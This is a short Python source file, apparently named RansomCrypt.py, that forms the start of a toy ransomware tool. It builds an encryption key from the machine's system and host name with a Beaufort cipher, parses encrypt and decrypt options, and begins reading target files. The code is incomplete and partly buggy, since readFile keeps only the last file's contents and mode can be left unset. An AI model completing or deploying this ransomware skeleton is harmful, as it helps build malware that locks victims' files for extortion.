import platform
from reverseCipher import *
from beaufortCipher import *
import sys
import getopt


# Function that creates the key by concatenating the
# system name and network name and encrypting them with
# the BeaufortCipher
def createKey():
    key = platform.system() + platform.node()
    keyR = reverse(key)
    key = encipher(key, keyR)
    return key


def getOption(argv):
    try:
        opts, args = getopt.getopt(argv, 'de', ["decrypt", "encrypt"])
    except getopt.GetoptError:
        print("RansomCrypt.py -e or RansomCrypt --encrypt to encrypt")
        print("RansomCrypt.py -d or RansomCrypt --decrypt to decrypt")
        sys.exit(2)
    for opt, arg in opts:
        if opt in ('-d', '--decrypt'):
            mode = 'decrypt'
        if opt in ('-e', '--encrypt'):
            mode = 'encrypt'
    return mode


# Function that switches the mode between encrypt and decrypt
def switchMode(mode):
    if (mode == 'encrypt'):
        mode_2 = 'decrypt'
    elif (mode == 'decrypt'):
        mode_2 = 'encrypt'
    return mode_2


def readFile(files):
    # Open each file one by one and encrypt or decrypt
    for i in range(len(files)):
        working_file = files[i]
        with open(working_file, 'r') as file:
            msg = file.read()
    return msg
